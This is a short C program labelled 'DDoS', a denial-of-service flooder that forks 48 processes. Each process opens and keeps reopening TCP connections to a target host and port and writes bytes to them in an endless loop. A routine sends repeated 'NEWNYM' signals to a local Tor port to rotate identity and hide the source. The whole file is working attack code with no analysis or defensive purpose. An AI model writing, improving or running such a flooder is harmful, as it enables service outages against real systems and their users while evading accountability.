// DDoS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int num=1;

int make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		num = num + 1;
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "[ - ] Error Not Find This IP OR PORT \n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[ %i ] [ CONNECT ]  [ %s:%s]\n",num, host, port);
	return sock;
}

void broke(int s) {
	// do nothing
}

#define CONNECTIONS 8
#define THREADS 48


void attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, g=1, r;
	for(x=0; x!= CONNECTIONS; x++)
		sockets[x]=0;
	signal(SIGPIPE, &broke);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = make_socket(host, port);
			r=write(sockets[x], "\0", 1);
			if(r == -1) {
				close(sockets[x]);
				sockets[x] = make_socket(host, port);
			} else
				continue;
			fprintf(stderr, "[ %i : DoDs Massge ]\n", id);
		}
		
		fprintf(stderr, "DoDs Number %i\nDoDs from IP=%s  PORT=%s  ACTIVE=200  id=%i time=0.%i \n",num, host ,port, id, num);
		num = num + 1;
	}
}

void cycle_identity() {
	int r;
	int socket = make_socket("localhost", "9050");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
	}
}

int main(int argc, char **argv) {
	int x;
	if(argc !=3)
		cycle_identity();
	for(x=0; x != THREADS; x++) {
		if(fork())
			attack(argv[1], argv[2], x);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}
